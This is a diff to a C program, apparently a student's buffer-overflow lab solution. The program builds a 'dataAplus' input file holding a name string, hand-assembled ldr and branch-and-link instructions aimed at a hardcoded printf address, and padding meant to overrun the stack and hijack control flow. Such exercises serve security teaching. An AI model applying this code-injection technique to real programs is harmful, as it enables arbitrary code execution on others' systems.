@@ -4,7 +4,7 @@
 int main(void) {
     FILE *dataAplus;
     unsigned int payloadAddress, printfAddress;
-    unsigned int ldrInstr, bInstr;
+    unsigned int ldrInstr, blInstr;
     const char *aPlusString = "A+\0"; 
 
     /* Open the dataAplus file for writing */
@@ -14,7 +14,6 @@ int main(void) {
     fprintf(dataAplus, "Alex & Matt");
     putc('\0', dataAplus);
 
-  
     printfAddress = 0x400690; 
     
     /* Calculate the address where the payload will be loaded */
@@ -29,12 +28,12 @@ int main(void) {
     fwrite(&ldrInstr, sizeof(ldrInstr), 1, dataAplus);
 
     /* Branch to printf */
-    bInstr = MiniAssembler_b(printfAddress, 0x42006c);
-    fwrite(&bInstr, sizeof(bInstr), 1, dataAplus);
+    blInstr = MiniAssembler_bl(printfAddress, 0x42006c);
+    fwrite(&blInstr, sizeof(blInstr), 1, dataAplus);
 
     /* Branch back to main function after getName */
-    bInstr = MiniAssembler_b(0x40089c, 0x420070);
-    fwrite(&bInstr, sizeof(bInstr), 1, dataAplus);
+    blInstr = MiniAssembler_bl(0x40089c, printfAddress);
+    fwrite(&blInstr, sizeof(blInstr), 1, dataAplus);
     
     /* add padding to overrun the stack */
     fprintf(dataAplus, "%s", "anganganganganganggg"); /* 20  characters */
